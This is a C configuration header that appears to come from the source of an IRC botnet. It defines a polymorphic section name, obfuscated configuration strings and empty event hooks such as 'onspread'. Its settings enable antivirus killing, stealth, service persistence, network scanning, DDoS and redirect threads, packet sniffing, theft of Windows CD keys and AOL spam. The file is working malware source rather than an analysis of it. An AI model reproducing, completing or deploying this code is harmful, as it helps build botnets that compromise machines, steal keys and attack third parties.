#ifndef __CONFIG_H__
#define __CONFIG_H__

#include "confbase.h"

// The section name for polymorph
#define SECTION_NAME ".jypnegr"

// Array of CVars
conf_cvar g_aCVars[] = {
	{	"bot_filename",	"",	"UGJ7l5RO3T5032hF",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"bot_id",	"",	"Hgf2o0AT1Kw2lGms",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"bot_prefix",	"",	NULL,	""	},
	{	"bot_timeout",	"0",	NULL,	""	},
	{	"bot_seclogin",	"false",	NULL,	""	},
	{	"bot_compnick",	"false",	NULL,	""	},
	{	"bot_randnick",	"false",	NULL,	""	},
	{	"bot_meltserver",	"false",	NULL,	""	},
	{	"bot_topiccmd",	"false",	NULL,	""	},
	{	"do_speedtest",	"false",	NULL,	""	},
	{	"do_avkill",	"false",	NULL,	""	},
	{	"do_stealth",	"false",	NULL,	""	},
	{	"as_valname",	"",	"jO0zkU7vkMwukSSr",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"as_enabled",	"false",	NULL,	""	},
	{	"as_service",	"false",	NULL,	""	},
	{	"as_service_name",	"",	"ua8noA1jNR4KWDuc",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"scan_maxthreads",	"0",	NULL,	""	},
	{	"scan_maxsockets",	"0",	NULL,	""	},
	{	"ddos_maxthreads",	"0",	NULL,	""	},
	{	"redir_maxthreads",	"0",	NULL,	""	},
	{	"identd_enabled",	"false",	NULL,	""	},
	{	"cdkey_windows",	"false",	NULL,	""	},
	{	"scaninfo_level",	"0",	NULL,	""	},
	{	"spam_aol_channel",	"",	"S1Noun3Xhffu8Lec",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"spam_aol_enabled",	"false",	NULL,	""	},
	{	"sniffer_enabled",	"false",	NULL,	""	},
	{	"sniffer_channel",	"",	"n0nXFmkCSxS6Me1v",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"scaninfo_chan",	"",	"wCGG1S85EBEWILul",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
	{	"inst_polymorph",	"false",	NULL,	""	},
	{	"vuln_channel",	"",	"s4wLHp1ae4Qe1vA0",	"\xD4\x1D\x8C\xD9\x8F\x00\xB2\x04\xE9\x80\x09\x98\xEC\xF8\x42\x7E"	},
};

// Array of Users
conf_user g_aUsers[] = {
};

// Array of Servers
conf_server g_aServers[] = {
};

// Script

char *g_szScript = \
	"onstart {\n" \
	"}\n" \
	"onconnect {\n" \
	"}\n" \
	"onjoin {\n" \
	"}\n" \
	"onlogin {\n" \
	"}\n" \
	"ondisconnect {\n" \
	"}\n" \
	"onremove {\n" \
	"}\n" \
	"onspread {\n" \
	"}\n" \
	"ondebugeractive {\n" \
	"}\n" \
	"ontimer 10080m {\n" \
	"}\n" \
	"onstartupfin {\n" \
	"}\n";

#endif // __CONFIG_H__
